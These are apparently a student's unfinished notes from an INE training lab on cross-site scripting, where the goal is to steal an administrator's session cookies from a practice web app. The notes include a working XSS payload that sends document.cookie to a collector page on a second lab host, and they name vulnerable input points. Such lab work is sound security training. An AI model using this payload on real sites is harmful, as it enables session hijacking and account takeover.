# XSS Lab 
# INE
# RCM 8/14/21

# Description
n this lab you can practice XSS attacks against a web application hosted at the address 192.168.99.10. Since the application allows registered users to add comments, we have already created an account on the application. The credentials of this account are:

    Username: attacker

    Password: attacker

Moreover, we created another web page in the lab for your convenience. You can use it to receive stolen cookies! You can find it at http://192.168.99.11/get.php : it takes all parameters passed via GET and stores them into the jar.txt file.

# Goal
The administrator visits the application every few minutes. The final goal of the lab is to steal the administrator cookies via XSS. Once you have these cookies you should be able to access the content of the page admin.php.

# Tools
Brain

# Steps

1. Find all XSS injection points in the web app.
- Log in with credentials attacker:attacker
- Go to blog
- Script is not working..<script>alert('document.cookie')</script>
- `<script> var i = new Image(); i.src="http://192.168.99.11/get.php?
cookie="+escape(document.cookie)</script>`
 - Injected into search bar because blog post comments were not working.
 - Feedback page form is also vulnerable.
 - I got my session cookies in the jar.txt
 - How to get admin cookies...
2. Steal admin cookies (restart lab)

